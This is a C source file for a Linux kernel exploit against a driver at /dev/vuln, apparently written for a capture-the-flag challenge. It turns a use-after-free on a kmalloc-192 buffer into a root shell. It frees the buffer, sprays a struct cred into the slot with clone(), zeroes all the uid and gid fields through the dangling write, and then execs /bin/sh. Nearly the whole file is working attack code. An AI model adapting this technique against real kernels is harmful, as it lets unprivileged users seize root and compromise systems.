// Since basically there's no protection and arbitrary size object UAF
// Just UAF struct cred of the current process
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <assert.h>
#include <stdatomic.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

struct cred {
	long long usage;
	int uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
};

int fd;
atomic_bool try = false;
atomic_bool win = false;
atomic_int num_failed = 0;

void alloc_buf(size_t size) {
	assert(ioctl(fd, ALLOC, &size) == 0);
}

void free_buf() {
	assert(ioctl(fd, FREE, NULL) == 0);
}

void write_buf(char* data) {
	assert(ioctl(fd, USE_WRITE, data) == 0);
}

void read_buf(char* data) {
	assert(ioctl(fd, USE_READ, data) == 0);
}

int check_privs(void *arg) {
	char flag[0x10] = {};
	int fd;

	while(atomic_load(&try) != true) {
		sleep(1);
	}

	if (geteuid() == 0) {
		puts("[+] Got r00t!!!");
		char *argv[] = {"/bin/sh", NULL};
		execve("/bin/sh", argv, NULL);
		atomic_store(&win, true);
		exit(0);
	} else {
		atomic_fetch_add(&num_failed, 1);
		exit(0);
	}
}


int main(void) {
	fd = open("/dev/vuln", O_RDWR);
	assert(fd != -1);
	puts("[*] Opened /dev/vuln");

	size_t cred_size = 180; // fit in kmalloc 192
	// There's no kconfig given...
	// I guess there's no cred_jar so we can uaf kmalloc 192 to overwrite the cred
	// Maybe CONFIG_MEMCG_KMEM is on
	printf("[*] Allocating buffer of size %zu\n", cred_size);
	alloc_buf(cred_size);
	char *buffer = malloc(cred_size);
	puts("[*] Freeing buffer");
	free_buf();
#define NUM_CRED_SPRAY 1 // We just need one cred to ocupy the UAF object since the heap is stable(?)
	printf("[*] Spraying the heap with %d cred objects using clone()...\n", NUM_CRED_SPRAY);
	// Code ref: https://r1ru.github.io/posts/3/
	char stacks[NUM_CRED_SPRAY][0x1000];

	pid_t pids[NUM_CRED_SPRAY];
	for (int i = 0; i < NUM_CRED_SPRAY; i++) {
		pids[i] = clone(check_privs, &stacks[i][0xfff], CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, NULL);
		assert(pids[i] != -1);
	}
	read_buf(buffer);
	printf("[*] UAF buffer: ");
	for (int i = 0; i < cred_size; i++) {
		printf("%02x", (unsigned char)buffer[i]);
	}
	printf("\n");
	int UAF_uid = *(int *)(buffer + 8);
	if (UAF_uid != geteuid()) {
		puts("[-] UAF object is not struct cred, exiting...");
		exit(1);
	} else {
		puts("[+] UAF object is struct cred!");
	}
	puts("[*] Dirtycred");
	struct cred fake_creds = { .usage = 2 };
	// we just want to overwrite the ids in cred, the rest don't change
	memcpy(buffer, &fake_creds, sizeof(fake_creds));
	write_buf(buffer);
	read_buf(buffer);
	printf("[*] UAF buffer: ");
	for (int i = 0; i < cred_size; i++) {
		printf("%02x", (unsigned char)buffer[i]);
	}
	printf("\n");
	// getchar();

	usleep(100000);
	atomic_store(&try, true);
	while(1) {
		if (atomic_load(&win) == true) {
			break;
		}
		if (atomic_load(&num_failed) == NUM_CRED_SPRAY) {
			puts("[-] Fail QQ");
			break;
		}
	}

	close(fd);

	return 0;
}